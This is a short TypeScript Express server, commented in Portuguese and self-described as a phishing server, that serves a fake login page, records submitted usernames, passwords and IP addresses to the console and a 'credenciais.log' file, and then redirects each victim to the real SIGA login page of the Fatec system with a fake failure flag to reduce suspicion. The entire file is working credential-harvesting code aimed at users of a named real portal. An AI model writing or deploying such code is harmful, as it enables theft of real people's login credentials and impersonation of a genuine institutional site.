import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';

// Inicializa a aplicação Express
const app = express();
const PORT: number = 8080;

// Middleware para interpretar o corpo das requisições com formato URL-encoded (formulários)
app.use(express.urlencoded({ extended: true }));

// Middleware para servir arquivos estáticos (nosso index.html)
// O 'path.join' garante que o caminho funcione em qualquer sistema operacional.
app.use(express.static(path.join(__dirname, '..')));

// Rota POST que recebe os dados do formulário de login
app.post('/login', (req: Request, res: Response) => {
    // Extrai o usuário e a senha do corpo da requisição
    const { usuario, senha } = req.body;
    
    // Captura o endereço IP do cliente. 'req.ip' pode ser undefined, então tratamos isso.
    const ip = req.ip || 'IP não encontrado';
    
    // Cria um timestamp no formato ISO (ex: "2025-08-25T22:00:00.000Z")
    const dataHora = new Date().toISOString();

    // Monta a string que será salva no log
    const logData = `[${dataHora}] - IP: ${ip} | Usuário: ${usuario} | Senha: ${senha}\n`;

    // Imprime as informações capturadas no console do servidor
    console.log("Credenciais Capturadas:");
    console.log(logData);

    // Adiciona a linha de log ao arquivo 'credenciais.log'
    // 'fs.appendFile' cria o arquivo se ele não existir
    fs.appendFile('credenciais.log', logData, (err) => {
        if (err) {
            console.error("Erro ao salvar o log:", err);
        }
    });

    // Redireciona a vítima para o site real do SIGA para diminuir as suspeitas.
    // A query "?Falha=1" simula uma falha de login no site real.
    res.redirect('https://siga.cps.sp.gov.br/fatec/login.aspx?Falha=1');
});

// Inicia o servidor e o faz escutar na porta definida
app.listen(PORT, () => {
    console.log(`Servidor de phishing (TS) rodando em http://localhost:${PORT}`);
    console.log("Acesse a URL acima para ver a página de login falsa.");
});